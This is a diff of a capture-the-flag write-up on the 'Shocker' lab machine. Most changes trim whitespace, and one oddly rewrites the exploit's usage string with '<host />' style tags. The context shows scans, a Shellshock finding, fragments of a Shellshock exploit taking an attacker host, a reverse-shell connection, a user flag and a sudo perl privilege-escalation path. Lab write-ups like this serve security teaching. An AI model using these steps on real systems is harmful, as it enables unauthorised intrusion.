@@ -31,11 +31,11 @@ run it all: `sudo nmap -v 10.10.10.56 -Pn -p- -sC -sV -O --min-rate=5000 -o nmap
 PORT     STATE SERVICE VERSION
 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
 |_http-title: Site doesn't have a title (text/html).
-| http-methods: 
+| http-methods:
 |_  Supported Methods: POST OPTIONS GET HEAD
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
 |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
 |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
@@ -185,7 +185,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /.htaccess            (Status: 403) [Size: 303]
 /.htpasswd.sh         (Status: 403) [Size: 306]
 /user.sh              (Status: 200) [Size: 118] <----------found it!
-                                               
+
 ===============================================================
 2022/04/10 00:21:35 Finished
 ===============================================================
@@ -205,7 +205,7 @@ Host is up (0.28s latency).
 
 PORT     STATE SERVICE VERSION
 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
-| http-shellshock: 
+| http-shellshock:
 |   VULNERABLE:
 |   HTTP Shellshock vulnerability
 |     State: VULNERABLE (Exploitable)
@@ -213,7 +213,7 @@ PORT     STATE SERVICE VERSION
 |       This web application might be affected by the vulnerability known
 |       as Shellshock. It seems the server is executing commands injected
 |       via malicious HTTP headers.
-|             
+|
 |     Disclosure date: 2014-09-24
 |     References:
 |       http://www.openwall.com/lists/oss-security/2014/09/24/10
@@ -241,7 +241,7 @@ added the hash-bang
 import httplib,urllib,sys
 
 if (len(sys.argv)<4):
-  print "Usage: %s <host> <vulnerable CGI> <attackhost/IP>" % sys.argv[0]
+  print "Usage: %s <host /> <vulnerable CGI /> <attackhost/IP />" % sys.argv[0]
   print "Example: %s localhost /cgi-bin/test.cgi 10.0.0.1/8080" % sys.argv[0]
   exit(0)
 
@@ -271,7 +271,7 @@ listening on [any] 443 ...
 10.10.10.56: inverse host lookup failed: Unknown host
 connect to [10.10.16.2] from (UNKNOWN) [10.10.10.56] 33484
 bash: no job control in this shell
-shelly@Shocker:/usr/lib/cgi-bin$ 
+shelly@Shocker:/usr/lib/cgi-bin$
 ```
 
 ### user.txt
@@ -282,7 +282,7 @@ user.txt
 cat user.txt
 cat user.txt
 2ec24e11320026d1e70ff3e16695b233
-shelly@Shocker:/home/shelly$ 
+shelly@Shocker:/home/shelly$
 ```
 
 ## PRIVESC
@@ -295,7 +295,7 @@ Matching Defaults entries for shelly on Shocker:
 
 User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
-shelly@Shocker:/home/shelly$ 
+shelly@Shocker:/home/shelly$
 ```
 
 ### root.txt
